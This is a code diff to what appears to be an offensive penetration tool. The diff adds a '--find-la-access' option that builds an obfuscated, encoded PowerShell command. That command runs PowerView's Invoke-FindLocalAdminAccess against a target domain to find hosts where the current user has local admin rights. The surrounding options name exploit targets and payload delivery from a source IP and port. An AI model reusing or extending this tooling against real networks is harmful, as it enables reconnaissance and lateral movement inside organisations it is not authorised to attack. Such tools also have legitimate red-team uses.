@@ -3805,6 +3805,7 @@ Create Pasteable Double Encoded Script:
     attack.add_argument("--get-forest-domains", action="store_true", dest="get_forest_domains", default=False, help="Identifies current user's Domains within the Forest")
     attack.add_argument("--get-forest", action="store_true", dest="get_forest", default=False, help="Identifies current user's Forrest")
     attack.add_argument("--get-dc", action="store_true", dest="get_dc", default=False, help="Identifies current user's Domain Controllers")
+    attack.add_argument("--find-la-access", action="store_true", dest="find_local_admin_access", default=False, help="Identifies systems the current user has local admin access to")
     remote_attack.add_argument("-t", action="store", dest="target", default=None, help="The targets you are attempting to exploit, multiple items can be comma seperated: Accepts IPs, CIDR, Short and Long Ranges")
     remote_attack.add_argument("-e", action="store", dest="exceptor", default=None, help="The exceptions to the targets you do not want to exploit, yours is inlcuded by default, multiple items can be comma seperated: Accepts IPs, CIDR, Short and Long Ranges")
     remote_attack.add_argument("-tl", action="store", dest="target_filename", default=None, help="The targets file with systems you want to exploit, delinated by new lines, multiple files can be comma separated")
@@ -3892,6 +3893,7 @@ Create Pasteable Double Encoded Script:
     get_domain = args.get_domain
     get_forest = args.get_forest
     get_forest_domains = args.get_forest_domains
+    find_local_admin_access = args.find_local_admin_access
     get_dc = args.get_dc
     netview_cmd = args.netview_cmd
     target_dom = args.target_dom
@@ -4276,6 +4278,26 @@ Create Pasteable Double Encoded Script:
             mim_func = "Get-NetDomainControllers"
         if payload == None:
             payload = "pv.ps1"
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
+        command, unprotected_command = x.return_command()
+        attacks = True
+    elif find_local_admin_access:
+        execution = "executor"
+        if mim_func == None:
+            mim_func = "Invoke-FindLocalAdminAccess"
+        if payload == None:
+            payload = "pv.ps1"
+        if mim_arg == None:
+            if not target_dom:
+                if sleep_value > 0:
+                    mim_arg = "-Domain %s -Delay %s" % (dom, sleep_value)
+                else:
+                    mim_arg = "-Domain %s" % (dom)
+            else:
+                if sleep_value > 0:
+                    mim_arg = "-Domain %s -Delay %s" % (target_dom, sleep_value)
+                else:
+                    mim_arg = "-Domain %s" % (target_dom)
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
         command, unprotected_command = x.return_command()
         attacks = True
